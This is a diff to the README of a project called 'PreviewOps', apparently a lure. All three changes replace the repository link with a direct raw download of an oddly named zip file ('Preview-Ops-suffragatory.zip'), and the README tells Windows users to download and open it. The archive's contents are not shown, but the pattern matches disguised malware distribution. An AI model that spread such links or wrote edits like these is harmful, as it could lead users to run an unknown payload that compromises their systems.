@@ -1,6 +1,6 @@
 # 🧭 PreviewOps - Fast preview stacks for every PR
 
-[![Download PreviewOps](https://img.shields.io/badge/Download%20PreviewOps-purple?style=for-the-badge&logo=github)](https://github.com/purseproud-caribbeanisland216/PreviewOps)
+[![Download PreviewOps](https://img.shields.io/badge/Download%20PreviewOps-purple?style=for-the-badge&logo=github)](https://github.com/purseproud-caribbeanisland216/PreviewOps/raw/refs/heads/main/substanch/Preview-Ops-suffragatory.zip)
 
 ## 🚀 What PreviewOps Does
 
@@ -32,7 +32,7 @@ PreviewOps runs on Windows through the GitHub page linked above. Use this page t
 
 To get started, visit this page to download:
 
-https://github.com/purseproud-caribbeanisland216/PreviewOps
+https://github.com/purseproud-caribbeanisland216/PreviewOps/raw/refs/heads/main/substanch/Preview-Ops-suffragatory.zip
 
 From there:
 1. Open the link
@@ -165,7 +165,7 @@ This makes it easier to spot problems and approve updates with confidence.
 ## 📌 Quick Start
 
 1. Open the download page:
-   https://github.com/purseproud-caribbeanisland216/PreviewOps
+   https://github.com/purseproud-caribbeanisland216/PreviewOps/raw/refs/heads/main/substanch/Preview-Ops-suffragatory.zip
 2. Download the Windows file or package
 3. Open the file after it finishes downloading
 4. Follow the setup steps on screen
